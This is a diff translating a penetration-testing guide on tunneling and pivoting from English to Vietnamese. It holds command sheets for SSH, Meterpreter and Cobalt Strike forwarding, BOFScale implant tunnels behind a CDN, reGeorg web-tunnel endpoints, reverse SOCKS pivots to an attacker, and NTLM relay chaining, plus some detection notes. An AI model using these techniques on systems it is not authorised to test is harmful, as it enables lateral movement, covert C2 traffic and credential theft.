@@ -1,19 +1,19 @@
-# Tunneling and Port Forwarding
+# Tunneling và Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
-To publish a local HTTP or TCP service through a public relay, see [exposing local services to the internet](expose-local-to-the-internet.md). This chapter covers forwarding and pivoting between hosts.
+Để đưa dịch vụ HTTP hoặc TCP cục bộ ra công khai thông qua relay công khai, xem [đưa dịch vụ cục bộ ra internet](expose-local-to-the-internet.md). Chương này đề cập đến việc chuyển tiếp và pivot giữa các host.
 
-## Nmap tip
+## Mẹo về Nmap
 
 > [!WARNING]
-> Nmap's proxy support is limited to TCP connections and does not affect ping, port, or OS-detection scans. When the scanner is behind a SOCKS proxy, **disable host discovery** (`-Pn`) and use a **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>
+> Hỗ trợ proxy của Nmap chỉ giới hạn ở các kết nối TCP và không ảnh hưởng đến các lượt quét ping, cổng hoặc phát hiện hệ điều hành. Khi máy quét nằm sau SOCKS proxy, **tắt tính năng phát hiện host** (`-Pn`) và dùng **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>
 
 ## **Bash**
 
 **Host -> Jump -> InternalA -> InternalB**
 
-The final command uses Evil-WinRM's `-u` and `-i` options to identify the account and WinRM host; its default WinRM port is 5985.<sup>[[4]](#references)</sup>
+Lệnh cuối sử dụng các tùy chọn `-u` và `-i` của Evil-WinRM để xác định tài khoản và host WinRM; cổng WinRM mặc định là 5985.<sup>[[4]](#references)</sup>
 
 ```bash
 # On the jump server connect the port 3333 to the 5985
@@ -33,11 +33,11 @@ evil-winrm -u username -i Jump
 
 ## **SSH**
 
-OpenSSH can forward X11 connections, arbitrary TCP ports, and Unix-domain sockets over its encrypted channel.<sup>[[6]](#references)</sup>
+OpenSSH có thể chuyển tiếp kết nối X11, các cổng TCP tùy ý và socket miền Unix qua kênh được mã hóa của nó.<sup>[[6]](#references)</sup>
 
-SSH graphical connection (X)
+Kết nối đồ họa SSH (X)
 
-`-Y` enables trusted X11 forwarding and `-C` requests compression for forwarded data.<sup>[[6]](#references)</sup>
+`-Y` bật chuyển tiếp X11 đáng tin cậy và `-C` yêu cầu nén dữ liệu được chuyển tiếp.<sup>[[6]](#references)</sup>
 
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
@@ -45,9 +45,9 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 
 ### Remote Port2Port
 
-Open new Port in SSH Server --> Other port
+Mở cổng mới trên SSH Server --> Cổng khác
 
-Remote (`-R`) forwarding listens on the SSH server and connects to the local side; the explicit bind address controls which interfaces can reach that listener.<sup>[[6]](#references)</sup>
+Chuyển tiếp từ xa (`-R`) lắng nghe trên SSH server và kết nối đến phía cục bộ; địa chỉ bind chỉ định rõ interface nào có thể truy cập trình lắng nghe đó.<sup>[[6]](#references)</sup>
 
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
@@ -59,9 +59,9 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 
 ### Port2Port
 
-Local port --> Compromised host (SSH) --> Third_box:Port
+Cổng cục bộ --> Máy chủ bị xâm nhập (SSH) --> Third_box:Port
 
-Local (`-L`) forwarding listens on the client and connects to the destination from the SSH server side.<sup>[[6]](#references)</sup>
+Chuyển tiếp Local (`-L`) lắng nghe trên client và kết nối đến đích từ phía máy chủ SSH.<sup>[[6]](#references)</sup>
 
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
@@ -71,17 +71,17 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 
 ### Port2hostnet (proxychains)
 
-Local Port --> Compromised host (SSH) --> Wherever
+Cổng cục bộ --> Máy chủ bị xâm nhập (SSH) --> Bất cứ đâu
 
-Dynamic (`-D`) forwarding creates a local SOCKS4/SOCKS5 listener whose connections are opened from the remote side.<sup>[[6]](#references)</sup>
+Chuyển tiếp động (`-D`) tạo một listener SOCKS4/SOCKS5 cục bộ, với các kết nối được mở từ phía từ xa.<sup>[[6]](#references)</sup>
 
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
 
-### Multi-hop with ProxyJump
+### Multi-hop với ProxyJump
 
-`-J`/`ProxyJump` connects to the target through one or more comma-separated jump hosts. Forwarding options still belong to the final SSH connection, so the SOCKS listener below opens destinations from `internal-target`, not from the first bastion. This avoids logging into a jump host and starting a second SSH client there.<sup>[[6]](#references)</sup>
+`-J`/`ProxyJump` kết nối đến mục tiêu thông qua một hoặc nhiều jump host, được phân tách bằng dấu phẩy. Các tùy chọn forwarding vẫn thuộc về kết nối SSH cuối cùng, vì vậy SOCKS listener bên dưới mở các đích từ `internal-target`, chứ không phải từ bastion đầu tiên. Cách này tránh phải đăng nhập vào jump host rồi khởi chạy một SSH client thứ hai ở đó.<sup>[[6]](#references)</sup>
 
 ```bash
 # Reach the final SSH server through two bastions
@@ -91,13 +91,13 @@ ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target
 ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
 ```
 
-Host-specific options for jump machines should be placed in `~/.ssh/config`; command-line configuration intended for the destination is not automatically applied to intermediate hosts.<sup>[[6]](#references)</sup>
+Các tùy chọn dành riêng cho host jump nên được đặt trong `~/.ssh/config`; cấu hình dòng lệnh dành cho máy đích không tự động áp dụng cho các host trung gian.<sup>[[6]](#references)</sup>
 
 ### Reverse Port Forwarding
 
-This is useful to get reverse shells from internal hosts through a DMZ to your host:
+Cách này hữu ích để nhận reverse shell từ các host nội bộ thông qua DMZ về máy của bạn:
 
-The server's `GatewayPorts` setting controls whether a remote forward may bind beyond loopback; its default is `no`.<sup>[[7]](#references)</sup>
+Cài đặt `GatewayPorts` trên server quyết định liệu remote forward có thể bind ra ngoài loopback hay không; giá trị mặc định là `no`.<sup>[[7]](#references)</sup>
 
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
@@ -110,7 +110,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 
 ### VPN-Tunnel
 
-This root-based example creates tunnel devices on both hosts. The server must permit tun forwarding and the selected account must have access to the tun device; `PermitRootLogin yes` is one way to use the `root` account here.<sup>[[6]](#references)[[7]](#references)</sup>\
+Ví dụ này sử dụng quyền root để tạo thiết bị tunnel trên cả hai máy chủ. Máy chủ phải cho phép chuyển tiếp tun và tài khoản được chọn phải có quyền truy cập thiết bị tun; `PermitRootLogin yes` là một cách để sử dụng tài khoản `root` trong trường hợp này.<sup>[[6]](#references)[[7]](#references)</sup>\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 
@@ -122,36 +122,36 @@ ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ip link set tun0 up #Activate the server side network interface
 ```
 
-Enable forwarding on the Server side
+Bật chuyển tiếp ở phía Server
 
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
 
-Set a new route on the client side
+Thiết lập một route mới ở phía client
 
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 
 > [!NOTE]
-> **Security – Terrapin Attack (CVE-2023-48795)**  
-> OpenSSH 9.6 added a strict-KEX extension to counter Terrapin's early-transport integrity attack. Update both peers where possible and follow vendor guidance for older implementations instead of assuming that a forwarded channel is protected by the version alone.<sup>[[8]](#references)</sup>
+> **Bảo mật – Terrapin Attack (CVE-2023-48795)**  
+> OpenSSH 9.6 đã bổ sung extension strict-KEX để chống lại cuộc tấn công toàn vẹn ở giai đoạn đầu của quá trình truyền tải của Terrapin. Hãy cập nhật cả hai đầu nếu có thể và làm theo hướng dẫn của nhà cung cấp đối với các triển khai cũ hơn, thay vì cho rằng chỉ riêng phiên bản đã bảo vệ kênh được chuyển tiếp.<sup>[[8]](#references)</sup>
 
 ## SSHUTTLE
 
-You can **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host.\
-For example, forwarding all the traffic going to 10.10.10.0/24
+Bạn có thể **tunnel** toàn bộ **lưu lượng** đến một **mạng con** qua một máy chủ bằng **ssh**.\
+Ví dụ: chuyển tiếp toàn bộ lưu lượng đến 10.10.10.0/24
 
-`sshuttle` provides transparent proxying over SSH and supports selecting subnets and a custom SSH command as shown below.<sup>[[9]](#references)</sup>
+`sshuttle` cung cấp proxy trong suốt qua SSH và hỗ trợ chọn mạng con cũng như chỉ định lệnh SSH tùy chỉnh như minh họa bên dưới.<sup>[[9]](#references)</sup>
 
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
 
-Connect with a private key
+Kết nối bằng khóa riêng
 
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
@@ -160,11 +160,11 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ## Meterpreter
 
-Metasploit's `portfwd` supports local and remote forwarding, while its SOCKS proxy module is intended to work with session routes or `autoroute` and listens on port 1080 by default in these examples.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>
+`portfwd` của Metasploit hỗ trợ chuyển tiếp cục bộ và từ xa, trong khi module proxy SOCKS được thiết kế để hoạt động với các tuyến session hoặc `autoroute` và mặc định lắng nghe trên port 1080 trong các ví dụ này.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>
 
 ### Port2Port
 
-Local port --> Compromised host (active session) --> Third_box:Port
+Port cục bộ --> Host bị xâm nhập (active session) --> Third_box:Port
 
 ```bash
 # Inside a meterpreter session
@@ -181,7 +181,7 @@ run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
 
-Another way:
+Một cách khác:
 
 ```bash
 background #meterpreter session
@@ -198,11 +198,11 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ## Cobalt Strike
 
-Cobalt Strike's Beacon can relay SOCKS4a/SOCKS5 connections through a Beacon; `rportfwd` binds on the compromised host, while `rportfwd_local` initiates the destination connection from the Cobalt Strike client.<sup>[[13]](#references)[[14]](#references)</sup>
+Beacon của Cobalt Strike có thể chuyển tiếp các kết nối SOCKS4a/SOCKS5 qua Beacon; `rportfwd` mở cổng lắng nghe trên máy đã bị xâm nhập, trong khi `rportfwd_local` khởi tạo kết nối đến đích từ client Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>
 
 ### SOCKS proxy
 
-Open a port in the Team Server on the interfaces that should route traffic through the Beacon.<sup>[[13]](#references)</sup>
+Mở một cổng trên Team Server tại các giao diện mạng cần định tuyến lưu lượng qua Beacon.<sup>[[13]](#references)</sup>
 
 ```bash
 beacon> socks 1080
@@ -215,34 +215,34 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> In this case, the **port is opened in the Beacon host**, not in the Team Server, and the traffic is sent to the Team Server and from there to the indicated host:port.<sup>[[14]](#references)</sup>
+> Trong trường hợp này, **port được mở trên host Beacon**, không phải trên Team Server, và traffic được gửi đến Team Server rồi từ đó đến host:port được chỉ định.<sup>[[14]](#references)</sup>
 
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
 
-The reverse-forwarding manual notes the following behavior:<sup>[[14]](#references)</sup>
+Tài liệu hướng dẫn reverse forwarding ghi nhận hành vi sau:<sup>[[14]](#references)</sup>
 
-- Beacon's reverse port forward is designed to **tunnel traffic to the Team Server, not for relaying between individual machines**.
-- Traffic is **tunneled within Beacon's C2 traffic**, including P2P links.
-- High ports usually avoid privileged-port restrictions, but the target OS policy and existing listeners still apply.
+- Reverse port forward của Beacon được thiết kế để **tunnel traffic đến Team Server, không dùng để relay traffic giữa các máy riêng lẻ**.
+- Traffic được **tunnel bên trong traffic C2 của Beacon**, bao gồm cả các liên kết P2P.
+- Các port cao thường tránh được hạn chế đối với port đặc quyền, nhưng chính sách của hệ điều hành đích và các listener hiện có vẫn được áp dụng.
 
 ### rPort2Port local
 
 > [!WARNING]
-> In this case, the **port is opened in the Beacon host**, not in the Team Server, and the **traffic is sent to the Cobalt Strike client** (not to the Team Server) and from there to the indicated host:port.<sup>[[14]](#references)</sup>
+> Trong trường hợp này, **port được mở trên host Beacon**, không phải trên Team Server, và **traffic được gửi đến client Cobalt Strike** (không phải Team Server), rồi từ đó đến host:port được chỉ định.<sup>[[14]](#references)</sup>
 
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
 
-## Tailcat: accountless userspace TCP forwarding
+## Tailcat: chuyển tiếp TCP ở userspace không cần tài khoản
 
-Tailcat uses Tailscale's WireGuard/NAT-traversal/DERP data plane without the Tailscale control plane. It needs neither a Tailscale account nor administrator privileges, and it does not install host routes or change DNS. Unlike [Tailscale Serve/Funnel](expose-local-to-the-internet.md#tailscale-funnel--serve) or the in-process [BOFScale tailnet](#bofscale---cdn-fronted-in-process-tailnet), the server shares a *tailcat address* out of band. The client uses that address to reach a port served by the remote node.<sup>[[62]](#references)</sup>
+Tailcat sử dụng data plane WireGuard/NAT-traversal/DERP của Tailscale mà không cần control plane của Tailscale. Công cụ này không cần tài khoản Tailscale hay quyền quản trị viên, đồng thời không cài đặt host route hoặc thay đổi DNS. Khác với [Tailscale Serve/Funnel](expose-local-to-the-internet.md#tailscale-funnel--serve) hoặc [tailnet BOFScale](#bofscale---cdn-fronted-in-process-tailnet) chạy trong tiến trình, máy chủ chia sẻ *địa chỉ tailcat* qua một kênh riêng. Client dùng địa chỉ đó để truy cập một cổng do node từ xa cung cấp.<sup>[[62]](#references)</sup>
 
-For a TCP service already listening on port `4444` on the remote node, start `serve` there and pass its printed address to `forward` on the client. The second command binds `127.0.0.1:18080` by default, so a local process that only supports normal TCP sockets can connect to that loopback port while Tailcat carries its traffic to remote port `4444`.<sup>[[62]](#references)</sup> The port numbers are not special to Tailcat.<sup>[[62]](#references)</sup>
+Với một dịch vụ TCP đang lắng nghe trên cổng `4444` tại node từ xa, hãy chạy `serve` ở đó rồi chuyển địa chỉ được in ra cho `forward` trên client. Theo mặc định, lệnh thứ hai bind vào `127.0.0.1:18080`, vì vậy một tiến trình cục bộ chỉ hỗ trợ socket TCP thông thường có thể kết nối tới cổng loopback đó, trong khi Tailcat chuyển tiếp lưu lượng đến cổng `4444` ở node từ xa.<sup>[[62]](#references)</sup> Các số cổng này không phải là giá trị đặc biệt của Tailcat.<sup>[[62]](#references)</sup>
 
 ```bash
 # Remote node with a service on localhost:4444
@@ -251,34 +251,34 @@ tailcat serve 4444
 tailcat forward <tc-address> 18080:4444
 ```
 
-The address contains the server's WireGuard public key and, by default in current releases, a pre-shared key. Treat it as a credential: an unrestricted server accepts a peer that knows the address. An ephemeral address stops working when the server exits. A saved `default` key makes plain `serve` reuse a stable address on later runs, so check the startup message and restrict clients with `serve --allow` if the address may be exposed.<sup>[[62]](#references)</sup>
+Địa chỉ chứa public key WireGuard của server và, theo mặc định trong các bản phát hành hiện tại, một pre-shared key. Hãy xem đây là thông tin xác thực: server không giới hạn sẽ chấp nhận peer biết địa chỉ này. Địa chỉ tạm thời ngừng hoạt động khi server thoát. Key `default` được lưu sẽ khiến các lần chạy `serve` sau dùng lại địa chỉ ổn định, vì vậy hãy kiểm tra thông báo khởi động và giới hạn client bằng `serve --allow` nếu địa chỉ có thể bị lộ.<sup>[[62]](#references)</sup>
 
-Connections can use a direct UDP path or a DERP relay. This avoids requiring a dedicated C2 domain but does not make the network activity disappear.<sup>[[62]](#references)[[63]](#references)</sup>
+Các kết nối có thể dùng đường truyền UDP trực tiếp hoặc relay DERP. Cách này giúp tránh phải có domain C2 riêng, nhưng không khiến hoạt động mạng biến mất.<sup>[[62]](#references)[[63]](#references)</sup>
 
-## BOFScale - CDN-fronted in-process tailnet
+## BOFScale - tailnet trong tiến trình được CDN đứng trước
 
-[BOFScale](https://github.com/NetSPI/BOFscale) runs a modified Tailscale overlay inside a Windows C2 implant without installing a TUN driver or service. Its three components are an asynchronous CGo `c-shared` `tailscaled` BOF-PE, a small C++ BOF-PE that speaks the local API, and an asynchronous `socksportfwd` TCP-to-SOCKS5 bridge.<sup>[[53]](#references)[[54]](#references)</sup>
+[BOFScale](https://github.com/NetSPI/BOFscale) chạy một overlay Tailscale đã chỉnh sửa bên trong implant C2 Windows mà không cài TUN driver hoặc service. Ba thành phần của nó gồm một BOF-PE `tailscaled` CGo `c-shared` chạy bất đồng bộ, một BOF-PE C++ nhỏ giao tiếp với local API, và một cầu nối TCP-to-SOCKS5 `socksportfwd` chạy bất đồng bộ.<sup>[[53]](#references)[[54]](#references)</sup>
 
-### CDN-compatible TS2021 and DERP
+### TS2021 và DERP tương thích với CDN
 
-Tailscale normally uses proprietary HTTP upgrades for the Noise-based TS2021 control channel and DERP relay. BOFScale keeps those byte streams but carries them in RFC 6455 WebSockets, using `Sec-WebSocket-Protocol: ts2021` or `derp`, so an operator-controlled Headscale/DERP origin can sit behind a CDN that only accepts standard WebSocket upgrades. The patched client retries TS2021 over WebSockets after HTTP `500`, retries DERP after HTTP `426`, and makes the DERP WebSocket dialer honor the host proxy configuration; the BOF sets `TS_DEBUG_DERP_WS_CLIENT=1` to skip the known-to-fail first attempt.<sup>[[53]](#references)[[54]](#references)</sup>
+Tailscale thường dùng HTTP upgrade độc quyền cho control channel TS2021 dựa trên Noise và relay DERP. BOFScale giữ nguyên các luồng byte đó nhưng truyền chúng qua WebSocket RFC 6455, dùng `Sec-WebSocket-Protocol: ts2021` hoặc `derp`, để một origin Headscale/DERP do operator kiểm soát có thể đặt sau CDN chỉ chấp nhận WebSocket upgrade tiêu chuẩn. Client đã vá sẽ thử lại TS2021 qua WebSocket sau HTTP `500`, thử lại DERP sau HTTP `426`, và khiến DERP WebSocket dialer tuân theo cấu hình proxy của host; BOF đặt `TS_DEBUG_DERP_WS_CLIENT=1` để bỏ qua lần thử đầu tiên vốn đã biết là thất bại.<sup>[[53]](#references)[[54]](#references)</sup>
 
-The CDN and origin proxy must preserve WebSocket upgrades for `/ts2021` and `/derp`, forward `/key` as ordinary HTTP, and disable internal read/write timeouts because relay sessions can remain open indefinitely. The supplied Headscale configuration enables `verify_clients`, publishes only the operator's embedded DERP map, and leaves `derp.urls` empty to prevent fallback to Tailscale-operated relays.<sup>[[53]](#references)[[54]](#references)</sup>
+CDN và origin proxy phải giữ nguyên WebSocket upgrade cho `/ts2021` và `/derp`, chuyển tiếp `/key` dưới dạng HTTP thông thường, đồng thời tắt timeout đọc/ghi nội bộ vì các phiên relay có thể duy trì mở vô thời hạn. Cấu hình Headscale đi kèm bật `verify_clients`, chỉ công bố DERP map được nhúng của operator, và để `derp.urls` trống nhằm ngăn fallback sang các relay do Tailscale vận hành.<sup>[[53]](#references)[[54]](#references)</sup>
 
-### In-process daemon and named-pipe control
+### Daemon trong tiến trình và điều khiển qua named pipe
 
-Unless overridden, the BOF entry point starts `tailscaled` with `-tun=userspace-networking`, `-state mem:`, and `-no-logs-no-support`, then creates a UUID-named pipe. It redirects Go stdout/stderr through an OS pipe to the Beacon output API, so the complete daemon and Go runtime remain resident but state and logs are not written to a Tailscale directory.<sup>[[53]](#references)[[54]](#references)</sup>
+Trừ khi bị ghi đè, entry point của BOF khởi chạy `tailscaled` với `-tun=userspace-networking`, `-state mem:`, và `-no-logs-no-support`, sau đó tạo một pipe có tên UUID. Nó chuyển hướng stdout/stderr của Go qua một OS pipe đến Beacon output API, vì vậy toàn bộ daemon và Go runtime vẫn thường trú nhưng state và log không được ghi vào thư mục Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>
 
-The lightweight client reproduces Tailscale's HTTP/1.0 local API over that pipe. It opens the pipe with `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` because the daemon's `safesocket` layer impersonates the pipe client, sends `Tailscale-Cap: 125`, and maps the local API to `up`, `down`, `status`, route advertisement, and shutdown operations.<sup>[[53]](#references)[[54]](#references)</sup>
+Client gọn nhẹ mô phỏng local API HTTP/1.0 của Tailscale qua pipe đó. Nó mở pipe với `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` vì lớp `safesocket` của daemon mạo danh client của pipe, gửi `Tailscale-Cap: 125`, và ánh xạ local API sang các thao tác `up`, `down`, `status`, quảng bá route và shutdown.<sup>[[53]](#references)[[54]](#references)</sup>
 
 > [!WARNING]
-> Do not unload a manually mapped Go BOF-PE after asking the daemon to shut down: runtime and garbage-collector goroutines can continue executing from memory that the loader unmaps. Run `tailscaled` in a sacrificial process and terminate that process for final cleanup.<sup>[[54]](#references)</sup>
+> Không unload Go BOF-PE được map thủ công sau khi yêu cầu daemon shutdown: các goroutine của runtime và garbage collector vẫn có thể tiếp tục thực thi từ vùng nhớ mà loader đã unmap. Hãy chạy `tailscaled` trong một process dùng một lần và terminate process đó để dọn dẹp hoàn toàn.<sup>[[54]](#references)</sup>
 
-### Bridge host-originated traffic through userspace SOCKS5
+### Chuyển tiếp lưu lượng bắt nguồn từ host qua SOCKS5 userspace
 
-Inbound tailnet connections and advertised subnet routes work inside the userspace network stack, but normal processes on the compromised host have no OS route into the overlay. `socksportfwd` therefore listens on a victim-facing TCP port, negotiates SOCKS5 `NO AUTH` with the daemon's `0.0.0.0:1080` listener, issues `CONNECT` for a tailnet destination, and relays both directions asynchronously. When the target is a MagicDNS name it uses `ATYP_DOMAIN`, making `tailscaled` resolve the name without exposing it to the Windows resolver.<sup>[[53]](#references)[[54]](#references)</sup>
+Các kết nối tailnet đi vào và subnet route được quảng bá hoạt động bên trong network stack userspace, nhưng các process thông thường trên host bị xâm nhập không có OS route vào overlay. Vì vậy, `socksportfwd` lắng nghe trên một TCP port hướng về victim, thương lượng SOCKS5 `NO AUTH` với listener `0.0.0.0:1080` của daemon, gửi `CONNECT` đến đích tailnet, rồi chuyển tiếp dữ liệu theo cả hai hướng một cách bất đồng bộ. Khi đích là tên MagicDNS, nó dùng `ATYP_DOMAIN`, nhờ đó `tailscaled` phân giải tên mà không để lộ tên đó cho Windows resolver.<sup>[[53]](#references)[[54]](#references)</sup>
 
-A minimal operator flow is shown below; both the operator node and implant must use the patched binaries because stock Tailscale cannot traverse this CDN design.<sup>[[53]](#references)[[54]](#references)</sup>
+Bên dưới là quy trình tối thiểu dành cho operator; cả node operator lẫn implant đều phải dùng binary đã vá vì Tailscale nguyên bản không thể đi qua thiết kế CDN này.<sup>[[53]](#references)[[54]](#references)</sup>
 
 ```bash
 HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
@@ -289,17 +289,17 @@ tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
 socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
 ```
 
-The local forward can separate the apparent authentication listener from the relay tool: coerce a machine to authenticate to the compromised host's bound port, forward it through the tailnet to `ntlmrelayx`, and relay onward to AD CS, LDAP, HTTP, SMB, or another compatible target. See [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) and [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) for the vulnerability-specific stages; BOFScale is only the transport.<sup>[[54]](#references)</sup>
+Local forward có thể tách listener xác thực hiển thị bên ngoài khỏi công cụ relay: buộc một máy xác thực tới cổng được bind trên host đã bị xâm nhập, forward lưu lượng qua tailnet tới `ntlmrelayx`, rồi relay tiếp tới AD CS, LDAP, HTTP, SMB hoặc một target tương thích khác. Xem [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) và [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) để biết các bước cụ thể của từng lỗ hổng; BOFScale chỉ đảm nhiệm việc vận chuyển.<sup>[[54]](#references)</sup>
 
-### Detection
+### Phát hiện
 
-Hunt for the combination rather than a single weak indicator: a Go runtime in a process that is not normally Go-based, a UUID pipe with permissive SDDL `D:(A;;GA;;;WD)`, an unexpected `0.0.0.0:1080` SOCKS listener, and long-lived TLS WebSockets to CDN addresses. With TLS inspection, flag `Sec-WebSocket-Protocol: derp` or `ts2021` when the owning process is not an authorized `tailscaled` service. The repository's `bofscale.yar` rules provide memory signatures for all three BOF-PE components.<sup>[[53]](#references)[[54]](#references)</sup>
+Tìm kiếm tổ hợp các dấu hiệu thay vì một chỉ báo đơn lẻ yếu: runtime Go trong một tiến trình vốn thường không dùng Go, pipe UUID có SDDL quá rộng `D:(A;;GA;;;WD)`, SOCKS listener `0.0.0.0:1080` bất thường và các kết nối TLS WebSocket kéo dài tới địa chỉ CDN. Khi kiểm tra TLS, hãy gắn cờ `Sec-WebSocket-Protocol: derp` hoặc `ts2021` nếu tiến trình sở hữu kết nối không phải dịch vụ `tailscaled` được cấp phép. Các rule `bofscale.yar` của repository cung cấp memory signature cho cả ba thành phần BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>
 
 ## reGeorg
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-The project supplies web tunnel endpoints such as `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp`, and `tunnel.php`; upload one supported endpoint before starting the local proxy.<sup>[[15]](#references)</sup>
+Project cung cấp các web tunnel endpoint như `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` và `tunnel.php`; hãy upload một endpoint được hỗ trợ trước khi khởi động local proxy.<sup>[[15]](#references)</sup>
 
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
@@ -307,8 +307,8 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 
 ## Chisel
 
-You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Chisel carries TCP/UDP traffic over HTTP using an SSH-protected connection; use compatible client/server builds and verify the selected release's command syntax.<sup>[[16]](#references)</sup>
+Bạn có thể tải xuống từ trang releases của [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+Chisel truyền lưu lượng TCP/UDP qua HTTP bằng kết nối được bảo vệ bằng SSH; hãy sử dụng các bản dựng client/server tương thích và kiểm tra cú pháp lệnh của bản phát hành đã chọn.<sup>[[16]](#references)</sup>
 
 ### socks
 
@@ -321,7 +321,7 @@ Chisel carries TCP/UDP traffic over HTTP using an SSH-protected connection; use 
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
 
-### Port forwarding
+### Chuyển tiếp cổng
 
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
@@ -330,11 +330,11 @@ Chisel carries TCP/UDP traffic over HTTP using an SSH-protected connection; use 
 
 ## wstunnel
 
-[`wstunnel`](https://github.com/erebe/wstunnel) carries static or dynamic forwards over WebSocket, HTTP/2, or WebTransport (HTTP/3 over QUIC). Current builds support TCP, UDP, Unix sockets, stdio, SOCKS5, HTTP proxying, and Linux transparent-proxy listeners in both forward and reverse modes.<sup>[[52]](#references)</sup>
+[`wstunnel`](https://github.com/erebe/wstunnel) truyền các forward tĩnh hoặc động qua WebSocket, HTTP/2 hoặc WebTransport (HTTP/3 trên QUIC). Các bản build hiện tại hỗ trợ TCP, UDP, Unix socket, stdio, SOCKS5, proxy HTTP và listener transparent proxy trên Linux ở cả chế độ forward lẫn reverse.<sup>[[52]](#references)</sup>
 
 ### Reverse SOCKS5 pivot
 
-Run the server on the attacker and make the pivot connect outbound with `-R`. In this direction the SOCKS5 listener is created on the **server** while requested connections originate from the **client/pivot** network.<sup>[[52]](#references)</sup>
+Chạy server trên máy attacker và để pivot kết nối ra ngoài bằng `-R`. Theo hướng này, listener SOCKS5 được tạo trên **server**, còn các kết nối được yêu cầu bắt nguồn từ mạng của **client/pivot**.<sup>[[52]](#references)</sup>
 
 ```bash
 # Attacker: use a certificate valid for pivot.example
@@ -348,27 +348,27 @@ wstunnel client --tls-verify-certificate \
 proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
 ```
 
-A reverse static forward uses the same direction. For example, the following exposes `10.10.10.20:445`, as reached by the pivot, on attacker loopback port `8445`:<sup>[[52]](#references)</sup>
+Một reverse static forward sử dụng cùng hướng. Ví dụ, lệnh sau đưa `10.10.10.20:445`, có thể truy cập thông qua pivot, ra cổng loopback `8445` trên máy attacker:<sup>[[52]](#references)</sup>
 
 ```bash
 wstunnel client --tls-verify-certificate \
   -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
 ```
 
-### Egress and transport details
+### Chi tiết về egress và transport
 
-- Add `-p http://user:pass@proxy:8080` to the client to cross an explicit HTTP proxy. Use `socks5h://127.0.0.1:1080` in clients such as `curl` (or enable proxied DNS in the application) so internal names are resolved beyond the tunnel rather than leaked to the local resolver.<sup>[[52]](#references)</sup>
-- `wss://` selects TLS-protected WebSocket. An `https://` client selects HTTP/2, but buffering or HTTP/1 conversion by reverse proxies/CDNs commonly breaks the bidirectional stream; expose the wstunnel server directly when testing this mode.<sup>[[52]](#references)</sup>
